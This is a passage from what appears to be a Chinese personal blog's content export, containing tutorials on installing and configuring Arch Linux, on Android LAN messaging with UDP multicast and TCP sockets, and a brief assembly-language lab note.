当然记得为新用户设置一个密码，执行如下命令： 1passwd username （请自行替换username为你的用户名） 根据提示输入两次密码就可以了，注意，这是你的用户密码，推荐与之前设置的root用户的密码不同。 配置sudo我们已经创建好了一个新的用户，以后我们将会使用这个用户来登录，那么如果我们需要执行一些只有root用户才能执行的命令（例如修改系统文件、安装软件包）怎么办？当然我们可以通过 1su 命令来切换到root用户执行命令后再通过 1exit 返回普通用户。 但是sudo为我们提供了一个更快捷的办法，使用sudo，我们只要在需要root权权限执行的命令之前加上sudo就可以了，例如安装软件包： 1sudo pacman -S something 下面我们就来安装并配置sudo。 sudo本身也是一个软件包，所以我们需要通过pacman来安装： 1pacman -S sudo 接下来我们需要用专门的visudo命令来编辑sudo的配置文件： 1visudo 实际上就是vim的操作，使用它是为了对编辑后的文件进行检查防止格式的错误。 找到 1# %wheel ALL=(ALL)ALL 这行，去掉之前的#注释符，保存并退出就可以了。 这里的%wheel就是代表wheel组，意味着wheel组中的所有用户都可以使用sudo命令。 当然为了安全使用sudo命令还是需要输入当前用户的密码的。 配置好sudo以后，我们进行一次重启，执行： 1reboot 来重启你的电脑。 重启以后输入你刚创建的用户名与密码来登录。 图形界面的安装显卡驱动的安装 参照这个表格，安装相应的包，比如你是intel的集成显卡（绝大多数人的情况），执行： 1sudo pacman -S xf86-video-intel 提示：Nvidia的独显驱动如非必要，建议只装集成显卡的驱动（省电，如果同时装也会默认使用集成显卡），不容易出现冲突问题。相反，如果集成显卡驱动有问题无法装上，可以装独显驱动，具体的版本请到下面的链接查询： https://wiki.archlinux.org/index.php/Xorg#Driver_installation 安装XorgXorg是Linux下的一个著名的开源图形服务，我们的桌面环境需要Xorg的支持。 执行如下命令安装Xorg及相关组件： 1sudo pacman -S xorg 安装桌面环境Linux下有很多著名的桌面环境如Xfce、KDE(Plasma)、Gnome、Unity、Deepin等等，它们的外观、操作、设计理念等各方面都有所不同， 在它们之间的比较与选择网上有很多的资料可以去查。 在这里我们选择笔者使用的Xfce和非常流行的KDE(Plasma)作为示范，当然你也可以把它们全部装上换着用……因为Linux的模块化，这样完全没有问题。 更多桌面环境的安装指南请见下面的链接： https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments 安装Xfce直接安装软件包组（包含了很多软件包）即可： 1sudo pacman -S xfce4 xfce4-goodies 安装KDE(Plasma)直接安装软件包组（包含了很多软件包）即可： 1sudo pacman -S plasma kde-applications kde-l10n-zh_cn 安装桌面管理器安装好了桌面环境包以后，我们需要安装一个图形化的桌面管理器来帮助我们登录并且选择我们使用的桌面环境，这里我推荐使用sddm。 安装sddm执行： 1sudo pacman -S sddm 设置开机启动sddm服务这里就要介绍一下Arch下用于管理系统服务的命令systemctl了，服务的作用就是字面意思，为我们提供特定的服务，比如sddm就为我们提供了启动xorg与管理桌面环境的服务。 命令的使用并不复杂： 1234sudo systemctl start 服务名 （启动一项服务）sudo systemctl stop 服务名 （停止一项服务）sudo systemctl enable 服务名 （开机启动一项服务）sudo systemctl disable 服务名 （取消开机启动一项服务） 所以这里我们就执行下面命令来设置开机启动sddm： 1sudo systemctl enable sddm 提前配置网络到现在我们已经安装好了桌面环境，但是还有一件事情需要我们提前设置一下。由于我们之前使用的一直都是netctl这个自带的网络服务，而桌面环境使用的是NetworkManager这个网络服务，所以我们需要禁用netctl并启用NetworkManager： 12sudo systemctl disable netctlsudo systemctl enable NetworkManager （注意大小写） 同时你可能需要安装工具栏工具来显示网络设置图标（某些桌面环境已经装了，但是为了保险可以再装一下）： 1sudo pacman -S network-manager-applet 这样开机以后我们就可以在图形界面下配置我们的网络啦。 重新启动后，如果你看到桌面管理器的界面，选择你需要的桌面环境并输入用户名与密码登陆后，看到了熟悉而又陌生的桌面，那么恭喜你，你已经完成了桌面环境的安装！ 你可能需要知道的操作与软件包推荐到这里，ArchLinux的安装与基本配置教程已经结束了，笔者在编写过程中基本凭着多次安装的经验与这次安装的记录完成，难免会有疏漏与不正确的地方，还请大家通过下面的评论或邮件(viseator@gmail.com)提出意见与建议。也欢迎你们与我交流安装的问题。 下一篇文章介绍了一些实用的配置（如中文输入法的安装）与软件包等。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"http://www.viseator.com/tags/Arch/"}]},{"title":"以官方Wiki的方式安装ArchLinux","date":"2017-05-17T15:26:29.000Z","path":"2017/05/17/arch_install/","text":"写在前面 这可能是你能找到的最适合你的中文ArchLinux安装教程。 前几天硬盘挂了，万幸的是家目录放在了另一块硬盘上所以存活了下来。不得不再重装一遍Arch，算上帮朋友装的，这已经是我第四次安装Arch了。也想借此机会记录这个过程写一篇完全按照官方Wiki指导再加上Wiki上没有重点写出来但是安装过程中会遇到的一些问题的一篇不太一样的安装教程。 很多人提起起Arch的第一反应就是安装困难，这种困难有很多原因，也就是接下来我们将会面对的问题。 没有图形界面的引导：Arch只给我们提供了一个最小的环境，所有的安装操作都需要在命令行中完成，这对于不习惯命令行操作的人来说是最难以跨越的一个坎。许多发行版之所以可以流行开来就是因为他们提供了友好的、流程化的安装过程，这帮很多人解决了学习Linux的第一步：安装一个Linux。 预备知识的不足与缺乏查找并解决问题的能力：一些对于安装系统比较重要的知识例如系统引导、配置文件的编辑、简单的命令行操作等没有接触过，所以操作时往往摸不着头脑，一旦自己的操作结果与教程不符便不知道如何去解决遇到的问题。 缺乏合适的教程：安装Arch最好的也是最完备的教程就是官方的Installation guide与Wiki，虽然部分内容有中文版，但是中文的翻译有些时候会落后于英文版，不推荐完全依赖于中文Wiki。并且官方Wiki的写作方式更偏向于文档，没有我们所习惯的按步骤编排的安装过程，给不熟悉这种写作方式的同学造成了阅读与使用上的困难。国内的可以找到的教程往往都是时间比较久远，或是没有提及或是忽略了一些新手容易犯错误的地方。 本篇教程致力于与现有的Wiki保持一致，并且适当地加入一些适合初学者学习的链接，希望可以让阅读了这篇教程的同学可以提高自己利用现有及以后可能出现的新的Wiki内容的能力。 ArchLinux或者是Linux的优点就不在这里多说了，我相信打开这篇教程的同学一定可以从这样的过程中得到很多。 下面就正式开始我们的教程。 安装教程前期准备安装介质在安装之前我们先要准备一个安装介质，在这里只推荐U盘作为安装介质。 到https://www.archlinux.org/download/页面下方的中国镜像源中下载archlinux-**-x86_64.iso这个iso文件。 如果是Linux系统下制作安装介质，推荐使用dd命令，教程： http://www.runoob.com/linux/linux-comm-dd.html 如果是windows系统下制作安装介质，推荐使用usbwriter这款轻量级的工具，下载链接： https://sourceforge.net/projects/usbwriter/ 磁盘准备我们需要有一块空闲的磁盘区域来进行安装，这里的空闲指的是没有被分区的空间。下面来介绍如何准备这块空间。 在windows下空出一块分区来安装：利用windows自带的磁盘管理工具就可以： 右击windows图标，在弹出菜单中选择磁盘管理（其他版本的windows请自行找到打开磁盘管理的方式）： 右击想要删除的分区，选择删除卷（注意这步之后这个分区的所有数据将会丢失）： 在linux下分出一块区域安装：使用fdisk进行，教程请见链接中的删除分区： http://www.liusuping.com/ubuntu-linux/linux-fdisk-disk.html 空闲的磁盘（新磁盘）：不需要进行任何操作。 U盘安装下面的过程实际上都在刚刚准备好的U盘启动介质上的Linux系统下进行，所以启动时都应该选择U盘。 设置启动顺序这一步在不同品牌的电脑上都不一样，所以需要大家自行搜索自己电脑品牌+启动顺序这个关键词来进行设置。 例如我的电脑搜索神舟 启动顺序可以得到如下的结果： https://zhidao.baidu.com/question/170954184.html 一般来说现在的主板都可以不用进入BIOS而快速地切换启动顺序，只要找到相应的快捷键就可以了。 进入U盘下的Linux系统 按上一步设置好启动顺序，启动之后会看到如下界面（UEFI启动方式的界面可能不同）： 如果直接进入windows，请检查启动顺序是否设置成功，U盘是否在制作启动介质时成功写入。 如果没有看到这个界面，请检查U盘是否制作成功，如果多次遇到问题可以考虑换一个U盘。 选择第一个选项。 这时Arch开始加载，你将会看到屏幕显示如下内容： 加载完成后你将会进入一个有命令提示符的界面： 如果出现FAIL或是其他错误信息导致无法启动请自行搜索错误信息来获得解决方法。 这就是Linux的终端界面了，接下来我们将通过在这个界面执行一系列命令来将Arch安装到我们的磁盘上。 下面进行的过程是按照官方Installation guide为依据进行的，出现的任何问题都可以到链接中的相应部分查找原文找到解决方式。 检查引导方式目前的引导方式主要分为EFI引导+GPT分区表与BIOS(LEGACY)引导+MBR分区表两种，几乎比较新的机器都采用了EFI/GPT引导的方式。关于这部分的内容如果有兴趣可以通过这个链接进行了解： http://www.chinaz.com/server/2016/1017/595444.shtml 如果你不知道自己的引导方式，请在命令提示符下执行以下命令： 1ls /sys/firmware/efi/efivars 这里的ls是命令，空格后面的一串为路径，作为ls命令的参数。ls命令的作用是显示路径目录下的所有的文件（夹）。 如果你对命令行下的常用操作（TAB补全、取消命令等）不熟悉，请先学习了解下面部分实用的快捷键或命令： Tab键 命令行自动补全。键入命令或文件名的前几个字符，然后按 [Tab] 键，它会自动补全命令或显示匹配你键入字符的所有命令 ↑(Ctrl+p) 显示上一条命令 ↓(Ctrl+n) 显示下一条命令 Ctrl-C: 终止当前正在执行的命令 输入命令并回车执行后，如果提示 1ls: cannot access '/sys/firmware/efi/efivars': No such file or directory 表明你是以BIOS方式引导，否则为以EFI方式引导。现在只需要记住这个信息，之后会用到。 联网arch并不能离线安装，因为我们需要联网来下载需要的组件，所以我们首先要连接网络。 如果你是有线网并且路由器支持DHCP的话插上网线后先执行以下命令获取IP地址： 1dhcpcd 然后执行以下命令来判断网络连接是否正常： 1ping www.baidu.com 如果可以看到类似下面的内容就说明连上了网络： 再次提示用快捷键Ctrl-C可以终止当前正在执行的命令 如果你是无线网，请执行以下命令： 1wifi-menu 这是一个实用的命令行下联网工具，有字符形式的图形化界面，利用它可以方便地联网，如果它没能起作用，需要进入以下页面查找解决方式： https://wiki.archlinux.org/index.php/Wireless_network_configuration 连接以后同样可以通过上面的ping命令来进行测试。 更新系统时间执行如下命令： 1timedatectl set-ntp true 正常情况下这样的命令并没有输出，所谓没有消息就是最好的消息 分区与格式化特别注意：涉及到分区与格式化的操作要格外注意，命令在回车之前请再三确认知道自己在做什么，并且没有输错命令，否则将会来带来数据的丢失！如果有需要在操作之前请备份重要的数据。 但是我们也并不要过于惧怕分区与格式化过程，正确操作的情况下不会对你其他数据产生任何影响。 查看目前的分区情况执行命令： 1fdisk -l 以我的电脑为例： 可以看到我的一块238.5g的硬盘(/dev/sda就代表这块硬盘)，下面列出了/dev/sda*这三个分区，/dev/sda3是我存活下来的家目录，可以看到它的类型为Linux分区。注意看Start与End的数值，这个数值代表扇区号，可以理解成硬盘被划分成了一个个小单元，可以直观地看出来在/dev/sda2的End与/dev/sda3的Start之间空出了一大块未分配的空间，接下来我们将分配这块区域。 如果你是BIOS/MBR方式引导，跳过下面创建一个引导分区的步骤。 如果你是EFI/GPT方式引导，并且同时安装了其他系统，那么你应该可以在分区列表中发现一个较小的并且类型为EFI的分区（注意查看硬盘的大小，这个EFI分区有可能是你U盘中的，需要排除），这是你的引导分区，请记下它的路径（/dev/sdxY)备用，跳过下面创建一个引导分区的步骤。 如果你是EFI/GPT方式引导，但是没有这个较小的并且类型为EFI的引导分区（这种情况一般只会出现在新的硬盘），那么你需要先创建一个引导分区。 创建一个引导分区（仅上面所列的第三种情况需要进行这步）执行命令： 1fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等） 下面你就进入了fdisk的操作环境， 输入m并回车可以查看各命令的作用。 如果你是一块全新的硬盘，输入g来创建一个全新的gpt分区表。 输入n创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，这里我们输入+512M来创建一个512M的引导分区。 这时我们可以输入p来查看新创建的分区。 输入t并选择新创建的分区序号来更改分区的类型，输入l可以查看所有支持的类型，输入ef更改分区的类型为EFI。 输入w来将之前所有的操作写入磁盘生效，在这之前可以输入p来确认自己的分区表没有错误。 输入以下命令来格式化刚刚创建的引导分区： 1mkfs.fat -F32 /dev/sdxY （请将的sdxY替换为刚创建的分区） 现在引导分区就创建好了。 创建根分区输入命令： 1fdisk /dev/sdx （请将sdx替换成你要操作的磁盘如sdb sdc等） 如果你是一块全新的硬盘，输入o来创建一个新的MBR分区表。 输入n创建一个新的分区，首先会让你选择起始扇区，一般直接回车使用默认数值即可，然后可以输入结束扇区或是分区大小，如果我们想要使创建的分区完全占满空闲的空间，可以直接回车使用默认结束扇区。 这时我们可以输入p来查看新创建的分区。 输入w来将之前所有的操作写入磁盘生效，在这之前可以输入p来确认自己的分区表没有错误。 输入以下命令来格式化刚刚创建的根分区： 1mkfs.ext4 /dev/sdxY （请将的sdxY替换为刚创建的分区） 这是我的分区过程供参考： 挂载分区执行以下命令将根分区挂载到/mnt： 1mount /dev/sdxY /mnt （请将sdxY替换为之前创建的根分区） 如果你是EFI/GPT引导方式，执行以下命令创建/boot文件夹并将引导分区挂载到上面。BIOS/MBR引导方式无需进行这步。 12mkdir /mnt/bootmount /dev/sdxY /mnt/boot （请将sdxY替换为之前创建或是已经存在的引导分区） 选择镜像源因为从这步开始，需要进行一些编辑配置文件的操作，所以需要掌握一些命令行下非常著名的一款编辑器Vim的基本操作，在这里推荐学习下面这个链接中的存活部分，可以完成编辑、复制粘贴与保存工作即可。 http://coolshell.cn/articles/5426.html 镜像源是我们下载的软件包的来源，我们需要根据自己的地区选择不同的源来加快下载的速度。 执行以下命令，用Vim来编辑/etc/pacman.d/mirrorlist这个文件 1vim /etc/pacman.d/mirrorlist 提示：输入路径时可以用Tab键补全 找到标有China的镜像源，normal模式下按下dd可以剪切光标下的行，按gg回到文件首，按p将行粘贴到文件最前面的位置（优先级最高）。 当然也可以直接手工输入。 这里推荐使用清华、浙大源： 12Server = http://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$archServer = http://mirrors.zju.edu.cn/archlinux/$repo/os/$arch 最后记得用:wq命令保存文件并退出。 安装基本包下面就要安装最基本的ArchLinux包到磁盘上了。这是一个联网下载并安装的过程。 执行以下命令： 1pacstrap /mnt base base-devel 根据下载速度的不同在这里需要等待一段时间，当命令提示符重新出现的时候就可以进行下一步操作了。 配置Fstab生成自动挂载分区的fstab文件，执行以下命令： 1genfstab -L /mnt &gt;&gt; /mnt/etc/fstab 由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令： 1cat /mnt/etc/fstab 如图，可以看到/dev/sda4被挂载到了根分区。 /dev/sda3是我之前存活下来的家目录被挂载到了/home目录（你们没有这条）。 如果是EFI/GPT引导的还应该有引导分区被挂载到/boot目录。 ChrootChroot意为Change root，相当于把操纵权交给我们新安装（或已经存在）的Linux系统，执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行。 执行如下命令： 1arch-chroot /mnt 这里顺便说一下，如果以后我们的系统出现了问题，只要插入U盘并启动， 将我们的系统根分区挂载到了/mnt下，再通过这条命令就可以进入我们的系统进行修复操作。 设置时区依次执行如下命令设置我们的时区为上海并生成相关文件： 12ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimehwclock --systohc 提前安装必须软件包因为我们现在已经Chroot到了新的系统中，只有一些最基本的包（组件），这时候我们就需要自己安装新的包了，下面就要介绍一下ArchLinux下非常强大的包管理工具pacman，大部分情况下，一行命令就可以搞定包与依赖的问题。 安装包的命令格式为pacman -S 包名，pacman会自动检查这个包所需要的其他包（即为依赖）并一起装上。下面我们就通过pacman来安装一些包，这些包在之后会用上，在这里先提前装好。 执行如下命令： 1pacman -S vim dialog wpa_supplicant ntfs-3g 一路确认之后包就被成功装上了。 图中只安装了Vim和它的依赖。 设置Locale设置我们使用的语言选项，执行如下命令来编辑/etc/locale.gen文件： 1vim /etc/locale.gen 在文件中找到zh_CN.UTF-8 UTF-8 zh_HK.UTF-8 UTF-8 zh_TW.UTF-8 UTF-8 en_US.UTF-8 UTF-8这四行，去掉行首的#号，保存并退出。如图： 然后执行： 1locale-gen 打开（不存在时会创建）/etc/locale.conf文件： 1vim /etc/locale.conf 在文件的第一行加入以下内容： 1LANG=en_US.UTF-8 保存并退出。 设置主机名打开（不存在时会创建）/etc/hostname文件： 1vim /etc/hostname 在文件的第一行输入你自己设定的一个myhostname 保存并退出。 编辑/etc/hosts文件： 1vim /etc/hosts 作如下修改（将myhostname替换成你自己设定的主机名） 123127.0.0.1 localhost.localdomain localhost::1 localhost.localdomain localhost127.0.1.1 myhostname.localdomain myhostname 这里我设置的是viseator。 保存并退出。 设置Root密码Root是Linux中具有最高权限帐户，有些敏感的操作必须通过Root用户进行，比如使用pacman，我们之前进行所有的操作也都是以Root用户进行的，也正是因为Root的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为Root帐户设置一个密码： 执行如下命令： 1passwd 按提示设置并确认就可以了。 或许有的人已经发现官方Wiki和一些其他教程资料中的命令是以#或$开头的，这两个符号就对应着命令行中的命令提示符，#代表以Root用户执行命令，$代表以普通用户执行命令，平时使用教程中的命令时应该注意这一点。 安装Intel-ucode（非IntelCPU可以跳过此步骤）直接pacman安装： 1pacman -S intel-ucode 安装Bootloader经常听说很多人因为引导问题导致系统安装失败，多数是因为教程没有统一或是过时的教程引起的，这里只要按照步骤来其实是不难的。 这里我们安装最流行的Grub2。 首先安装os-prober这个包，它可以配合Grub检测已经存在的系统，自动设置启动选项。 1pacman -S os-prober 如果为BIOS/MBR引导方式： 安装grub包： 1pacman -S grub 部署grub： 1grub-install --target=i386-pc /dev/sdx （将sdx换成你安装的硬盘） 注意这里的sdx应该为硬盘（例如/dev/sda），而不是形如/dev/sda1这样的分区。 生成配置文件： 1grub-mkconfig -o /boot/grub/grub.cfg 如果你没有看到如图所示的提示信息，请仔细检查是否正确完成上面的过程。 如果报warning failed to connect to lvmetad，falling back to device scanning.错误。参照这篇文章，简单的方法是编辑/etc/lvm/lvm.conf这个文件，找到use_lvmetad = 1将1修改为0，保存，重新配置grub。 如果为EFI/GPT引导方式： 安装grub与efibootmgr两个包： 1pacman -S grub efibootmgr 部署grub： 1grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub 生成配置文件： 1grub-mkconfig -o /boot/grub/grub.cfg 提示信息应与上面的图类似，如果你发现错误，请仔细检查是否正确完成上面的过程。 如果报warning failed to connect to lvmetad，falling back to device scanning.错误。参照这篇文章，简单的方法是编辑/etc/lvm/lvm.conf这个文件，找到use_lvmetad = 1将1修改为0，保存，重新配置grub。 安装后检查如果你是多系统，请注意上面一节中对os-prober这个包的安装。 强烈建议使用如下命令检查是否成功生成各系统的入口，如果没有正常生成会出现开机没有系统入口的情况： 1vim /boot/grub/grub.cfg 检查接近末尾的menuentry部分是否有windows或其他系统名入口。下图例子中是Arch Linux入口与检测到的windows10入口（安装在/dev/sda1），具体情况可能有不同： 如果你没有看到Arch Linux系统入口或者该文件不存在，请先检查/boot目录是否正确部署linux内核： 12cd /bootls 查看是否有initramfs-linux-fallback.img initramfs-linux.img intel-ucode.img vmlinuz-linux这几个文件，如果都没有，说明linux内核没有被正确部署，很有可能是/boot目录没有被正确挂载导致的，确认/boot目录无误后，可以重新部署linux内核： 1pacman -S linux 再重新生成配置文件，就可以找到系统入口。 如果你已经安装os-prober包并生成配置文件后还是没有生成其他系统的入口： 你目前处的U盘安装环境下有可能无法检测到其他系统的入口，请在下一步中重启登陆之后重新运行：1grub-mkconfig -o /boot/grub/grub.cfg 如果还没有生成其他系统的入口，请参照： https://wiki.archlinux.org/index.php/GRUB/Tips_and_tricks#Combining_the_use_of_UUIDs_and_basic_scripting 编辑配置文件手动添加引导的分区入口。 重启接下来，你需要进行重启来启动已经安装好的系统，执行如下命令： 12exitreboot 注意这个时候你可能会卡在有两行提示的地方无法正常关机，长按电源键强制关机即可，没有影响。 关机后拔出U盘，启动顺序会自动以硬盘启动，如果一切顺利，那么你将会看到下面的界面： 启动时有可能会有输出信息显示在这里，直接回车就可以了。 输入root，再输入之前设置的密码，显示出命令提示符，恭喜你，你已经成功安装ArchLinux！ 安装后配置虽然系统安装好了，但是还没有进行基本配置和安装图形界面，所以接下来我们要进行一些必须的配置和图形界面的安装。 请见下一篇文章：ArchLinux安装后的必须配置与图形界面安装教程 特别感谢评论区中Senrey_Song、YKun、imzhwk、haonan mao、Lichen Zhang对于本教程内容的指正。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.viseator.com/tags/Linux/"},{"name":"Arch","slug":"Arch","permalink":"http://www.viseator.com/tags/Arch/"}]},{"title":"Android利用UDP、TCP进行局域网数据传输","date":"2017-05-11T07:58:06.000Z","path":"2017/05/11/android_lan_messages/","text":"写在前面在团队内部的hackweek中实现了一个在局域网环境中（同一个wifi下）进行的卡片收发小游戏，踩了一些关于局域网内通信的坑，这篇博文就用来整理一下整个过程的思路，完整代码地址。 实现思路在整个过程中利用到了UDP与TCP两种传输层协议，两者的特性决定了使用上的不同。 简单地说，UDP非面向连接，不需要先与目标建立连接，所以UDP不提供可靠的数据传输，也不能保证数据准确无误地到达目的地，但UDP的优势在于它可以迅速传送大量信息，传输性能比较好。 而TCP是面向连接的协议，需要经过三次握手与目的地址建立一个稳定的连接，可以保证数据准确、完整地到达。但是它的传输效率就没有UDP那么高。 首先，为了数据传输的稳定和准确性，在传送主要数据部分我们必需使用TCP来建立一个点对点的稳定的连接来传输主要数据。 但是，为了建立一个TCP连接，请求的一方必须要知道被请求一方（下面简称服务方）的IP地址。而在局域网中，如果我们想要实现每个人连接局域网以后马上可以收发信息，由于每次加入时分配到的IP地址并不是固定的也无法提前得知，所以我们需要使用其他的办法先获取到服务方的IP地址。 这时就要利用到UDP协议的组播特性了，组播可以让设备都加入一个预设好的组，然后就可以向这个组中发送数据包，只要加入了这个组的设备都可以收到这个数据包。这样只要所有的设备都提前加入了同一个组，不需要互相知道IP地址就可以交换数据，那么我们应该如何利用这样的特性呢？ 结合我们的实际需求，游戏过程是每个人可以向所有人发送一个只有标题的匿名卡片（这个过程就符合UDP组播的特性），如果感兴趣的人就可以点击收到的卡片来打开这个卡片查看具体内容（这个过程就需要我们建立TCP连接来传输数据）。 所以我们就有了思路，向所有人发送卡片的过程使用UDP进行组播，数据包中除了包含标题信息还要包含一个发送人的IP地址以及一个Mac地址作为ID（考虑到重新连接后地址发生改变的问题），当所有人收到这个卡片以后需要建立连接的时候就可以得到发送人的IP来进行TCP连接。 下面我们来实现这个过程。 具体实现组播我们定义一个ComUtil类来处理组播 加入组12345678910111213public static final String CHARSET = \"utf-8\";private static final String BROADCAST_IP = \"224.0.1.2\"; //IP协议中特殊IP地址，作为一个组，用来集合加入的所有客户端public static final int BROADCAST_PORT = 7816; //广播目的端的端口号private static final int DATA_LEN = 4096;private MulticastSocket socket = null;private InetAddress broadcastAddress = null;//当前设备在局域网下的IP地址byte[] inBuff = new byte[DATA_LEN];private DatagramPacket inPacket = new DatagramPacket(inBuff, inBuff.length);//用于接受对象的packetprivate DatagramPacket outPacket = null;//用于发送对象的packetprivate Handler handler;public ComUtil(Handler handler) &#123; this.handler = handler;//回调使用Handler机制&#125; 12345678910111213public void startReceiveMsg() &#123; try &#123; socket = new MulticastSocket(BROADCAST_PORT);//打开一个组播Socket broadcastAddress = InetAddress.getByName(BROADCAST_IP);//需要进行一步转换来使用String类型的IP地址 socket.joinGroup(broadcastAddress);//加入一个组 outPacket = new DatagramPacket(new byte[0], 0, broadcastAddress, BROADCAST_PORT);//用于发送数据包的DatagramPacket &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; //下面两行用于下文中的开始接收广播 Thread thread = new Thread(new ReadBroad()); thread.start();&#125; 注释应该讲得比较清楚了，这里要注意的是UDP数据的收发需要使用一个DatagramPacket来进行。可以理解为一个数据包。 接收组播信息上面的代码最后两行新建了一个线程用于接收组播信息，具体代码如下： 123456789101112131415class ReadBroad implements Runnable &#123; public void run() &#123; while (true) &#123; try &#123; socket.receive(inPacket); Message message = new Message(); message.what = BROADCAST_PORT; message.obj = inBuff; handler.sendMessage(message); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 进行了一个无限循环，进行到第5行时如果没有收到广播的DatagramPacket会一直处于阻塞状态，收到一个DatagramPacket后就会通过Handler来转发出去，在Handler所在线程来处理这个数据包。之后再进行循环不断地接收并处理数据包。 发送组播信息123456789101112131415161718public void broadCast(final byte[] msg) &#123; Thread thread = new Thread(new Runnable() &#123; @Override public void run() &#123; try &#123; outPacket.setData(msg); //数据来源为外部，类型是二进制数据 socket.send(outPacket);//向组中发送该数据包 &#125; catch (IOException ex) &#123; ex.printStackTrace(); if (socket != null) &#123; socket.close(); &#125; &#125; &#125; &#125;); thread.start();&#125; 这个方法由外部调用，传入一个二进制数组数据通过setData()放在数据包中向组中的所有成员发送。成员通过上一节的接收方法接收到的就会是同样的数据包。 数据处理建立了组播的工具，下一步就要建立一个数据对象来进行信息的交换。由于数据包中的数据只能是以字节码的形式存在，所以我们设计的数据对象一定要是可序列化的（也就是实现了Serializable接口的），再通过流工具进行转换。 1234567public class UDPDataPackage implements Serializable &#123; private String ipAddress; private String macAddress; private String title; private String id; ...&#125; 在这个简单的JavaBean中只定义了四个简单数据。 我们将自己的信息设置后就可以通过如下方法转换成一个字节数组再通过上面的广播方法来发送： 1comUtil.broadCast(ConvertData.objectToByte(new UDPDataPackage(...))); //发送数据 123456789101112//通过流来进行的序列化public static byte[] objectToByte(Object object) &#123; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream outputStream; try &#123; outputStream = new ObjectOutputStream(byteArrayOutputStream); outputStream.writeObject(object); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return byteArrayOutputStream.toByteArray();&#125; 同样的，在接收到数据以后可以反序列化来得到原对象： 1234567891011public static Object byteToObject(byte[] bytes) &#123; ByteArrayInputStream byteInputStream = new ByteArrayInputStream(bytes); Object object = null; try &#123; ObjectInputStream objectInputStream = new ObjectInputStream(byteInputStream); object = objectInputStream.readObject(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; return object;&#125; 这样，我们就可以从这个对象中获取想到的IP地址等信息了。 建立TCP连接传输数据想要建立TCP连接，需要客户端与服务端两端的配合，我们现在已经获取到了需要建立连接的IP地址，下面我们要做的是与这个地址的服务端建立连接再传输数据。服务端需要一直运行来随时准备接受可能的请求。 由于我们同一个设备既要作为客户端，也要作为服务端，所以要编写两个类。 服务端12345public void startServer(Handler handler) &#123; this.handler = handler;//利用handler进行处理 thread = new Thread(new RunServer()); thread.start();//另开一个线程接收连接请求&#125; 1234567891011121314151617181920212223242526272829303132333435class RunServer implements Runnable &#123; @Override public void run() &#123; ServerSocket serverSocket = null; try &#123; serverSocket = new ServerSocket();//初始化一个ServerSocket serverSocket.setReuseAddress(true); serverSocket.bind(new InetSocketAddress(SERVER_PORT));//与端口绑定 &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; while (true) &#123; try &#123; Socket socket = serverSocket.accept();//利用accept方法获得socket InputStream inputStream; inputStream = socket.getInputStream();//获取输入流（来源自客户端） ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);//转换为对象输入流 //获取udpDataPackage对象 UDPDataPackage udpDataPackage = (UDPDataPackage) objectInputStream.readObject(); OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//将数据包写入输出流传送给客户端 objectOutputStream.flush();//刷新流 objectOutputStream.close(); outputStream.close(); objectInputStream.close(); inputStream.close(); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 解释见注释。 客户端1234567public void sendRequest(String ipAddress, UDPDataPackage udpDataPackage, Handler handler) &#123; this.ipAddress = ipAddress;//即为之前获取到的IP地址 this.udpDataPackage = udpDataPackage; this.handler = handler; thread = new Thread(new SendData()); thread.start();&#125; 12345678910111213141516171819202122232425262728293031323334class SendData implements Runnable &#123; @Override public void run() &#123; Socket socket = null; try &#123; socket = new Socket(ipAddress, SERVER_PORT);//新建一个socket socket.setReuseAddress(true); socket.setKeepAlive(true);//设置socket属性 socket.setSoTimeout(5000);//设置超时 //获得一个对象输出流 OutputStream outputStream = socket.getOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(outputStream); objectOutputStream.writeObject(udpDataPackage);//将请求包写入输出流（传送给服务端） //获取服务端返回的流 InputStream inputStream = socket.getInputStream(); ObjectInputStream objectInputStream = new ObjectInputStream(inputStream); udpDataPackage dataPackage = (udpDataPackage) objectInputStream.readObject();//获取到返回的数据对象 //转发给handler进行处理 Message msg = new Message(); msg.what = SERVER_PORT; msg.obj = dataPackage; handler.sendMessage(msg); &#125; catch (SocketTimeoutException e) &#123; try &#123; if (socket != null) socket.close(); &#125; catch (IOException e1) &#123; e1.printStackTrace(); &#125; sendRequest(ipAddress, udpDataPackage, handler); &#125; catch (IOException | ClassNotFoundException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 解释见注释。 可以看见TCP连接还是比较简单的，设置好socket并获取到输入输出流以后就可以把服务端当作本地流一样操作，具体的网络通信实现过程被隐藏了，有了流以后就可以进行所有能对流进行的操作了。到这里，我们要实现的局域网数据传输已经完成了。","tags":[{"name":"Android","slug":"Android","permalink":"http://www.viseator.com/tags/Android/"},{"name":"Network","slug":"Network","permalink":"http://www.viseator.com/tags/Network/"}]},{"title":"王爽汇编语言第三版实验9 双循环实现","date":"2017-04-10T12:44:49.000Z","path":"2017/04/10/assembly_wang_lab_9/","text":"编程：在屏幕中间分别显示绿色、绿底红色、白底蓝色的字符串welcome to masm!。 效果图： 采用了双循环嵌套的写法，外层控制输出行数，内层逐字符读取ASCII码与对应行的属性。 把loop s1改为loop s2有惊喜哦 所有实验答案在这里 